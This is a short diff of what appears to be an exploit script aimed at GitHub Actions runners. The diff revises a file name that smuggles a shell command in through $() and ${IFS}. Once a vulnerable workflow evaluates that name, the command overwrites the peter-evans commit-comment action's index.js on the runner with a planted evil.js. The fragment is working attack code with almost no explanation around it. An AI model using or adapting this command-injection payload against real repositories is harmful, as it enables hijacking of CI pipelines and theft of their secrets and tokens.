@@ -97,5 +97,5 @@ const rq = async (path, opts = {}) => {
   console.log('SLEEP_DONE=' + new Date().toISOString());
 })().catch((e) => console.log('EVIL_ERROR=' + e));
 JS
-OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}tmp${S}content${S}content${S}rce.txt).txt'
+OVR='rce$(S=$(dirname${IFS}${HOME%runner});D=${S}tmp${S}content${S}content;cd$D;cp evil.js ${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;cp evil.js rce.txt).txt'
 touch "$OVR"
